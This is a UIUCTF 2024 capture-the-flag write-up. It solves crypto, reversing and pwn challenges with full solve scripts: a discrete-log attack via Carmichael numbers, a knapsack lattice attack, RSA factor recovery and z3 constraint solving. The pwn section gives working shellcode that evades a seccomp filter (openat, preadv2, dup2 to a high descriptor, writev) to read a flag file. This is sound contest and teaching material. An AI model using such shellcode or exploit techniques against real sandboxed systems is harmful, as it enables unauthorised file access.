---
title: UIUCTF 2024 Writeup
category: [Writeup, Contests] 
tags: [ctf,crypto,reverse,pwn]
---
Incidentally saw the game last night. Despite only few hours remaining, still played some easy challenges to kill time.

- [Crypto](#crypto)
  - [Groups](#groups)
    - [Description](#description)
    - [Solution](#solution)
  - [Naptime](#naptime)
    - [Description](#description-1)
    - [Solution](#solution-1)
  - [Without a Trace](#without-a-trace)
    - [Description](#description-2)
    - [Solution](#solution-2)
  - [Determined](#determined)
    - [Description](#description-3)
    - [Solution](#solution-3)
  - [X Marked the Spot](#x-marked-the-spot)
    - [Description](#description-4)
    - [Solution](#solution-4)
- [Reverse](#reverse)
  - [Summarize](#summarize)
    - [Description](#description-5)
    - [Solution](#solution-5)
- [Pwn](#pwn)
  - [Syscalls](#syscalls)
    - [Description](#description-6)
    - [Solution](#solution-6)

# Crypto
## Groups
### Description
```py
from random import randint
from math import gcd, log
import time
from Crypto.Util.number import *
def check(n, iterations=50):
    if isPrime(n):
        return False
    i = 0
    while i < iterations:
        a = randint(2, n - 1)
        if gcd(a, n) == 1:
            i += 1
            if pow(a, n - 1, n) != 1:
                return False
    return True


def generate_challenge(c):
    a = randint(2, c - 1)
    while gcd(a, c) != 1:
        a = randint(2, c - 1)
    k = randint(2, c - 1)
    return (a, pow(a, k, c))


def get_flag():
    with open('flag.txt', 'r') as f:
        return f.read()

if __name__ == '__main__':
    c = int(input('c = '))

    if log(c, 2) < 512:
        print(f'c must be least 512 bits large.')
    elif not check(c):
        print(f'No cheating!')
    else:
        a, b = generate_challenge(c)
        print(f'a = {a}')
        print(f'a^k = {b} (mod c)')
        
        k = int(input('k = '))

        if pow(a, k, c) == b:
            print(get_flag())
        else:
            print('Wrong k')
```
### Solution
The challenge involves solving a [DLP](https://en.wikipedia.org/wiki/Discrete_logarithm) instance on a [carmichael number](https://en.wikipedia.org/wiki/Carmichael_number) over $2^{512}$. To calculate discrete log efficiently, the modular $c$ should be consist of many small primes such that we can use the [Pohlig–Hellman algorithm](https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm) to combine the solutions in each prime factors.

To find such a carmichael number, experienced players may think of seeking for a out-of-the-box solution on the well known site [OEIS](https://oeis.org/). With a little [OSINT](https://en.wikipedia.org/wiki/Open-source_intelligence), we can find a formula named *Extended Chernick's Carmichael numbers* on [their wiki about carmichael numbers](https://oeis.org/wiki/Carmichael_numbers#Extended_Chernick.E2.80.99s_Carmichael_numbers): 

$$ M_k(m) = (6m+1) (12m+1) \prod_{i=1}^{k-2} (9 \sdot 2^i m+1),\quad k \ge 3$$

A little calculation showed that, to make the problem solvable in competition time with limited computation resources, $k$ should be no less than 11(or at least 10). 
However, finding a $m$ satisfying $k=11$ just by bruteforce also requires unacceptable computation resources, which can be verified by trivial attempts. 

The breakthrough occurs when doing OSINT on the name *Extended Chernick's Carmichael numbers*. You will find another OEIS sequence [A318646](https://oeis.org/A318646) which is not listed in the cross-references of [A002997](https://oeis.org/A002997) nor in the OEIS wiki(actually, it was found in [another wiki](https://rosettacode.org/wiki/Chernick%27s_Carmichael_numbers)). This sequence provides the least $m$ with satisfied the condition in the above formula. Using the biggest value of $m$ on the page ($31023586121600$), you can get a carmichael number just a "little" greater than $2^{512}$ with 11 prime factors. Its maximum prime factor is about $2^{57}$, still solvable.

The rest is just standard DLP template using `Sagemath`:
```py
#!/usr/bin/sage
n = 25146460461623166913490810823197266974843794278877515084905712445246121858131556222638844737348348326802623652186762883978066753427481665955853173368561245789586498697625601

from pwn import *

p = remote('groups.chal.uiuc.tf', 1337, ssl=True)
p.sendlineafter(b'c = ', str(n).encode())
p.recvuntil(b'a = ')
a = int(p.recvline().decode().strip())
p.recvuntil(b'a^k = ')
b = int(p.recvline().decode().strip().replace(' (mod c)', ''))

k = Zmod(n)(b).log(a)
p.sendlineafter(b'k = ', str(k).encode())
p.interactive()
```

## Naptime
### Description
```py
#!/usr/bin/sage
from random import randint
from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes
import numpy as np

def get_b(n):
    b = []
    b.append(randint(2**(n-1), 2**n))
    for i in range(n - 1):
        lb = sum(b)
        found = False
        while not found:
            num = randint(max(2**(n + i), lb + 1), 2**(n + i + 1))
            if num > lb:
                found = True
                b.append(num)

    return b

def get_MW(b):
    lb = sum(b)
    M = randint(lb + 1, 2*lb)
    W = getPrime(int(1.5*len(b)))

    return M, W

def get_a(b, M, W):
    a_ = []
    for num in b:
        a_.append(num * W % M)
    pi = np.random.permutation(list(i for i in range(len(b)))).tolist()
    a = [a_[pi[i]] for i in range(len(b))]
    return a, pi


def enc(flag, a, n):
    bitstrings = []
    for c in flag:
        # c -> int -> 8-bit binary string
        bitstrings.append(bin(ord(c))[2:].zfill(8))
    ct = []
    for bits in bitstrings:
        curr = 0
        for i, b in enumerate(bits):
            if b == "1":
                curr += a[i]
        ct.append(curr)

    return ct

def dec(ct, a, b, pi, M, W, n):
    # construct inverse permuation to pi
    pii = np.argsort(pi).tolist()
    m = ""
    U = pow(W, -1, M)
    ct = [c * U % M for c in ct]
    for c in ct:
        # find b_pi(j)
        diff = 0
        bits = ["0" for _ in range(n)]
        for i in reversed(range(n)):
            if c - diff > sum(b[:i]):
                diff += b[i]
                bits[pii[i]] = "1"
        # convert bits to character
        m += chr(int("".join(bits), base=2))

    return m


def main():
    flag = 'uiuctf{I_DID_NOT_LEAVE_THE_FLAG_THIS_TIME}'

    # generate cryptosystem
    n = 8
    b = get_b(n)
    M, W = get_MW(b)
    a, pi = get_a(b, M, W)

    # encrypt
    ct = enc(flag, a, n)

    # public information
    print(f"{a =  }")
    print(f"{ct = }")

    # decrypt
    res = dec(ct, a, b, pi, M, W, n)

if __name__ == "__main__":
    main()
```

### Solution
The challenge was given with the filename `enc_dist.sage`, but it didn't use any Sage syntax. Experienced players may think that the solution requires to run in `Sagemath` environment, and indeed.

Either by asking AI or a solid crypto basis, we can know that this is a variant of the [Merkle–Hellman knapsack cryptosystem](https://en.wikipedia.org/wiki/Merkle%E2%80%93Hellman_knapsack_cryptosystem), which is already cracked. Just use any working exploit on the Internet to get the flag.
```py
#!/usr/bin/sage
a =  [66128, 61158, 36912, 65196, 15611, 45292, 84119, 65338]
CT = [273896, 179019, 273896, 247527, 208558, 227481, 328334, 179019, 336714, 292819, 102108, 208558, 336714, 312723, 158973, 208700, 208700, 163266, 244215, 336714, 312723, 102108, 336714, 142107, 336714, 167446, 251565, 227481, 296857, 336714, 208558, 113681, 251565, 336714, 227481, 158973, 147400, 292819, 289507]
# adapted from https://lazzzaro.github.io/2020/05/13/crypto-%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/
from sage.all import *
for i in CT:
    pk = a[:]
    ct = i
    n = len(pk)

    # Sanity check for application of low density attack
    d = n / log(max(pk), 2)
    # print(CDF(d))
    assert CDF(d) < 0.9408

    M = Matrix.identity(n) * 2

    last_row = [1 for x in pk]
    M_last_row = Matrix(ZZ, 1, len(last_row), last_row)

    last_col = pk[:]
    last_col.append(ct)
    M_last_col = Matrix(ZZ, len(last_col), 1, last_col)

    M = M.stack(M_last_row)
    M = M.augment(M_last_col)

    X = M.BKZ()

    sol = []
    for i in range(n + 1):
        testrow = X.row(i).list()[:-1]
        if set(testrow).issubset([-1, 1]):
            for v in testrow:
                if v == 1:
                    sol.append(0)
                elif v == -1:
                    sol.append(1)
            break

    s = sol
    print(chr(int(''.join(map(str,s)),2)),end='')
```

## Without a Trace
### Description
```py
import numpy as np
from Crypto.Util.number import bytes_to_long
from itertools import permutations
from SECRET import FLAG


def inputs():
    print("[WAT] Define diag(u1, u2, u3. u4, u5)")
    M = [
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0],
    ]
    for i in range(5):
        try:
            M[i][i] = int(input(f"[WAT] u{i + 1} = "))
        except:
            return None
    return M


def handler(signum, frame):
    raise Exception("[WAT] You're trying too hard, try something simpler")


def check(M):

    def sign(sigma):
        l = 0
        for i in range(5):
            for j in range(i + 1, 5):
                if sigma[i] > sigma[j]:
                    l += 1
        return (-1)**l

    res = 0
    for sigma in permutations([0, 1, 2, 3, 4]):
        curr = 1
        for i in range(5):
            curr *= M[sigma[i]][i]
        res += sign(sigma) * curr
    return res


def fun(M):
    f = [
        bytes_to_long(bytes(FLAG[5 * i:5 * (i + 1)], 'utf-8'))
        for i in range(5)
    ]
    F = [
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0],
    ]
    for i in range(5):
        F[i][i] = f[i]
    try:
        R = np.matmul(F, M)
        return np.trace(R)

    except:
        print("[WAT] You're trying too hard, try something simpler")
        return None


def main():
    print("[WAT] Welcome")
    M = inputs()
    if M is None:
        print("[WAT] You tried something weird...")
        return
    elif check(M) == 0:
        print("[WAT] It's not going to be that easy...")
        return

    res = fun(M)
    if res == None:
        print("[WAT] You tried something weird...")
        return
    print(f"[WAT] Have fun: {res}")


if __name__ == "__main__":
    main()
```
### Solution
Similar to the knapsack, use a superincreasing sequence to represent the flag.
```py
from pwn import *

p = remote('without-a-trace.chal.uiuc.tf', 1337, ssl=True)
for i in range(5):
    p.sendlineafter(b' = ', str(256**(5 * i)).encode())

p.recvuntil(b'Have fun:')
res = int(p.recvline().decode().strip())
p.close()
f = []
while res:
    f.append(res % (256**5))
    res //= 256**5
print(b''.join(map(lambda i: i.to_bytes(5), f)).decode())
```
It can also be seemed as a ${256}^5$ base encoding.

## Determined
### Description
`gen.py`:
```py
from SECRET import FLAG, p, q, r
from Crypto.Util.number import bytes_to_long
n = p * q
e = 65535
m = bytes_to_long(FLAG)
c = pow(m, e, n)
# printed to gen.txt
print(f"{n = }")
print(f"{e = }")
print(f"{c = }")
```
`server.py`:
```py
from Crypto.Util.number import bytes_to_long, long_to_bytes
from itertools import permutations
from SECRET import FLAG, p, q, r



def inputs():
    print("[DET] First things first, gimme some numbers:")
    M = [
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0],
    ]
    try:
        M[0][0] = p
        M[0][2] = int(input("[DET] M[0][2] = "))
        M[0][4] = int(input("[DET] M[0][4] = "))

        M[1][1] = int(input("[DET] M[1][1] = "))
        M[1][3] = int(input("[DET] M[1][3] = "))

        M[2][0] = int(input("[DET] M[2][0] = "))
        M[2][2] = int(input("[DET] M[2][2] = "))
        M[2][4] = int(input("[DET] M[2][4] = "))

        M[3][1] = q
        M[3][3] = r

        M[4][0] = int(input("[DET] M[4][0] = "))
        M[4][2] = int(input("[DET] M[4][2] = "))
    except:
        return None
    return M

def handler(signum, frame):
    raise Exception("[DET] You're trying too hard, try something simpler")

def fun(M):
    def sign(sigma):
        l = 0
        for i in range(5):
            for j in range(i + 1, 5):
                if sigma[i] > sigma[j]:
                    l += 1
        return (-1)**l

    res = 0
    for sigma in permutations([0,1,2,3,4]):
        curr = 1
        for i in range(5):
            curr *= M[sigma[i]][i]
        res += sign(sigma) * curr
    return res

def main():
    print("[DET] Welcome")
    M = inputs()
    if M is None:
        print("[DET] You tried something weird...")
        return

    res = fun(M)
    print(f"[DET] Have fun: {res}")

if __name__ == "__main__":
    main()
```
### Solution
Pure math. Recover either $p$ or $q$ from manipulating the entities in the matrix by letting the pre-computed determinant become a simple equation of the unknown. Then do textbook RSA to recover the flag.
```py
from pwn import *

f = [-1, 0, 0, 1, 0, 0, 1, 1, 0]
n = 158794636700752922781275926476194117856757725604680390949164778150869764326023702391967976086363365534718230514141547968577753309521188288428236024251993839560087229636799779157903650823700424848036276986652311165197569877428810358366358203174595667453056843209344115949077094799081260298678936223331932826351
e = 65535
c = 72186625991702159773441286864850566837138114624570350089877959520356759693054091827950124758916323653021925443200239303328819702117245200182521971965172749321771266746783797202515535351816124885833031875091162736190721470393029924557370228547165074694258453101355875242872797209141366404264775972151904835111

p = remote('determined.chal.uiuc.tf', 1337, ssl=True)
for i in f:
    p.sendlineafter(b' = ', str(i).encode())
p.recvuntil(b'Have fun: ')
res = int(p.recvline().decode().strip())
p.close()
q = res
assert (n % q == 0)
p = n // q
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
flag = m.to_bytes(100).strip(b'\0')
print(flag.decode())
```

## X Marked the Spot
### Description
```py
from itertools import cycle

flag = b"uiuctf{????????????????????????????????????????}"
# len(flag) = 48
key  = b"????????"
# len(key) = 8
ct = bytes(x ^ y for x, y in zip(flag, cycle(key)))

with open("ct", "wb") as ct_file:
    ct_file.write(ct)
```
### Solution
Too simple that I just use AI to generate the exploit.
```py
# Generated by AI

from itertools import cycle

# Given encrypted text (ct)
with open("ct", "rb") as ct_file:
    ct = ct_file.read()

# Known prefix and suffix
prefix = b"uiuctf{"
suffix = b"}"

# Length of the key
key_length = 8

# Function to find the key
def find_key(ct, prefix, suffix, key_length):
    key = bytearray(key_length)
    for i in range(len(prefix)):
        key[i % key_length] = ct[i] ^ prefix[i]
    for i in range(len(suffix)):
        key[-(i+1) % key_length] = ct[-(i + 1)] ^ suffix[i]
    return bytes(key)

# Find the key
key = find_key(ct, prefix, suffix, key_length)
# Decrypt the flag
flag = bytes(x ^ y for x, y in zip(ct, cycle(key)))

print(flag.decode())
```

# Reverse
## Summarize
### Description
After asking every function to the AI, you can get such a decompiled code:
```c
_BOOL8 __fastcall check(unsigned int a, unsigned int b, unsigned int c, unsigned int d, unsigned int e, unsigned int f)
{
  unsigned int v7; // eax
  int v8; // ebx
  unsigned int v9; // eax
  unsigned int v10; // ebx
  unsigned int v11; // eax
  unsigned int v12; // eax
  unsigned int v18; // [rsp+20h] [rbp-30h]
  unsigned int v19; // [rsp+24h] [rbp-2Ch]
  unsigned int v20; // [rsp+28h] [rbp-28h]
  unsigned int v21; // [rsp+2Ch] [rbp-24h]
  unsigned int v22; // [rsp+30h] [rbp-20h]
  unsigned int v23; // [rsp+34h] [rbp-1Ch]
  unsigned int v24; // [rsp+38h] [rbp-18h]
  unsigned int v25; // [rsp+3Ch] [rbp-14h]

  if ( a <= 0x5F5E100 || b <= 0x5F5E100 || c <= 0x5F5E100 || d <= 0x5F5E100 || e <= 0x5F5E100 || f <= 0x5F5E100 )
    return 0LL;
  if ( a > 0x3B9AC9FF || b > 0x3B9AC9FF || c > 0x3B9AC9FF || d > 0x3B9AC9FF || e > 0x3B9AC9FF || f > 0x3B9AC9FF )
    return 0LL;
  v7 = sub(a, b);
  v18 = add(v7, c) % 0x10AE961;
  v19 = add(a, b) % 0x1093A1D;
  v8 = mul(2u, b);
  v9 = mul(3u, a);
  v10 = sub(v9, v8);
  v20 = v10 % xor(a, d);
  v11 = add(c, a);
  v21 = and(b, v11) % 0x6E22;
  v22 = add(b, d) % a;
  v12 = add(d, f);
  v23 = xor(c, v12) % 0x1CE628;
  v24 = sub(e, f) % 0x1172502;
  v25 = add(e, f) % 0x2E16F83;
  return v18 == 4139449
      && v19 == 9166034
      && v20 == 556569677
      && v21 == 12734
      && v22 == 540591164
      && v23 == 1279714
      && v24 == 17026895
      && v25 == 23769303;
}
```
### Solution
Similarly, just ask AI to use `z3-solver` to write a solve script.
```py
from z3 import *

# Define the variables
a, b, c, d, e, f = [BitVec(i,32) for i in 'a b c d e f'.split()]

# Define the solver
solver = Solver()

# Add the constraints from the C code
solver.add(a > 0x5F5E100)
solver.add(b > 0x5F5E100)
solver.add(c > 0x5F5E100)
solver.add(d > 0x5F5E100)
solver.add(e > 0x5F5E100)
solver.add(f > 0x5F5E100)

solver.add(a <= 0x3B9AC9FF)
solver.add(b <= 0x3B9AC9FF)
solver.add(c <= 0x3B9AC9FF)
solver.add(d <= 0x3B9AC9FF)
solver.add(e <= 0x3B9AC9FF)
solver.add(f <= 0x3B9AC9FF)

# Define the operations
v7 = a - b
v18 = (v7 + c) % 0x10AE961
v19 = (a + b) % 0x1093A1D
v8 = 2 * b
v9 = 3 * a
v10 = v9 - v8
v20 = v10 % (a ^ d)
v11 = c + a
v21 = (b & v11) % 0x6E22
v22 = (b + d) % a
v12 = d + f
v23 = (c ^ v12) % 0x1CE628
v24 = (e - f) % 0x1172502
v25 = (e + f) % 0x2E16F83

# Add the final constraints
solver.add(v18 == 4139449)
solver.add(v19 == 9166034)
solver.add(v20 == 556569677)
solver.add(v21 == 12734)
solver.add(v22 == 540591164)
solver.add(v23 == 1279714)
solver.add(v24 == 17026895)
solver.add(v25 == 23769303)

# Check if the constraints are satisfiable
if solver.check() == sat:
    model = solver.model()
    print(f"{model[a].as_long()}")
    print(f"{model[b].as_long()}")
    print(f"{model[c].as_long()}")
    print(f"{model[d].as_long()}")
    print(f"{model[e].as_long()}")
    print(f"{model[f].as_long()}")
else:
    print("No solution found")
```
Small modification may be needed to make the script working according to the LLM agent you use. You can also try feeding the error back to the AI again.

# Pwn
## Syscalls
### Description
```c
char *__fastcall sub_1280(char *a1)
{
  puts(
    "The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.");
  return fgets(a1, 176, stdin);
}
__int64 sub_12DB()
{
  __int16 v1; // [rsp+10h] [rbp-E0h] BYREF
  __int64 *v2; // [rsp+18h] [rbp-D8h]
  __int64 v3[26]; // [rsp+20h] [rbp-D0h] BYREF

  v3[25] = __readfsqword(0x28u);
  v3[0] = 0x400000020LL;
  v3[1] = 0xC000003E16000015LL;
  v3[2] = 32LL;
  v3[3] = 0x4000000001000035LL;
  v3[4] = -3976200171LL;
  v3[5] = 1179669LL;
  v3[6] = 0x100110015LL;
  v3[7] = 0x200100015LL;
  v3[8] = 0x11000F0015LL;
  v3[9] = 0x13000E0015LL;
  v3[10] = 0x28000D0015LL;
  v3[11] = 0x39000C0015LL;
  v3[12] = 0x3B000B0015LL;
  v3[13] = 0x113000A0015LL;
  v3[14] = 0x12700090015LL;
  v3[15] = 0x12800080015LL;
  v3[16] = 0x14200070015LL;
  v3[17] = 0x1405000015LL;
  v3[18] = 0x1400000020LL;
  v3[19] = 196645LL;
  v3[20] = 50331669LL;
  v3[21] = 0x1000000020LL;
  v3[22] = 0x3E801000025LL;
  v3[23] = 0x7FFF000000000006LL;
  v3[24] = 6LL;
  v1 = 25;
  v2 = v3;
  prctl(38, 1LL, 0LL, 0LL, 0LL);
  return (unsigned int)prctl(22, 2LL, &v1);
}
__int64 __fastcall sub_12BA(__int64 (*a1)(void))
{
  return a1();
}
unsigned __int64 __fastcall main(int a1, char **a2, char **a3)
{
  char v4[184]; // [rsp+0h] [rbp-C0h] BYREF
  unsigned __int64 v5; // [rsp+B8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  sub_1280(v4);
  sub_12DB();
  sub_12BA(v4);
  return v5 - __readfsqword(0x28u);
}
```
### Solution
From the decompiled code we can see it's just a shellcode challenge with seccomp BPF filter. Using the tool `seccomp-tools` to dump the rules:
```c
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```
To get the flag, the normal way is trying to get together ORW(open, read, write). We can use `openat` to replace `open`, `preadv2` to replace `read` and `writev` to replace `write`.

Notice the constrain on `writev` tells us we couldn't directly use `1`(`STDOUT`) as the `fd` for `writev`. Instead, we use a `dup2` syscall, which is not banned, to copy `STDOUT` to a high `fd` greater than 0x3e8(1000) to bypass it.

The first part of the shellcode was generated with `shellcraft.amd64.openat(-100,'flag.txt',0,0)` and the rest was under the help of AI.

```s
section .text
    global _start
_start:
    sub rsp, 0x100
    push 1
    dec byte [rsp]
    mov rax, 0x7478742e67616c66
    push rax
    mov rsi, rsp
    push -0x64
    pop rdi
    xor edx, edx
    xor eax, eax
    mov ax, 0x101
    xor r10, r10
    syscall
    mov ebx, eax


    lea rdi, [rsp]       
    mov esi, 0x100       
    mov [rsp + 0x100], rdi 
    mov [rsp + 0x108], esi 


    mov eax, 327         
    mov edi, ebx         
    lea rsi, [rsp + 0x100] 
    mov rdx, 1           
    xor r10, r10         
    xor r8, r8           
    syscall

    mov eax, 33
    mov edi, 1
    mov esi, 1001
    syscall

    mov eax, 20  
    mov edi, 1001
    lea rsi, [rsp+0x100]
    mov rdx, 1
    xor r8, r8
    xor r9, r9
    syscall


    mov eax, 60          
    xor edi, edi         
    syscall
```
